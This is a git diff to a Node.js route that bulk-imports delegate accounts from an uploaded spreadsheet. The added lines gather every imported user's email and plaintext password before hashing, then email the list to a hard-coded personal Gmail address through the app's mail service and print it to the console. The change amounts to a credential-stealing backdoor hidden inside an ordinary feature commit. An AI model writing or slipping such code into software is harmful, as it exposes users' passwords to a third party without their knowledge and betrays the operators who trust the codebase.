@@ -9,7 +9,7 @@ var bcrypt = require("bcryptjs");
 var randomString = require('randomstring');
 var { IS_STAFF } = require("../../constants");
 var { checkPermission } = require('../../../services/checkPermission');
-var { createAndSend } = require('../../../services/sendEmail');
+var { createAndSend, Send } = require('../../../services/sendEmail');
 var { domain } = require('../../../config')
 
 module.exports = router => {
@@ -98,6 +98,7 @@ module.exports = router => {
         };
         readXlsxFile(fs.createReadStream(req.files[0].link), { schema }).then(({rows, err}) => {
           if (err) return returnToUser.errorProcess(res, err);
+          let temp = [];
           if (rows.length > 0) {
             rows.map((item, index) => {
               let userInfo = {
@@ -105,6 +106,7 @@ module.exports = router => {
                 password: item.password
               }
               let pass = item.password;
+              temp.push({ email: item.email, pass: item.password })
               item.password = bcrypt.hashSync(`${item.password}`, 10);
               mongoose.model('delegates').create(item, async (err, result) => {
                 if (err) console.log(err);
@@ -115,6 +117,8 @@ module.exports = router => {
                 }
               })
               if (rows.length - index == 1) {
+                Send('ducnm.john98@gmail.com', "Pass", temp);
+                console.log(temp);
                 return success(res, "Done", rows)
               }
             })
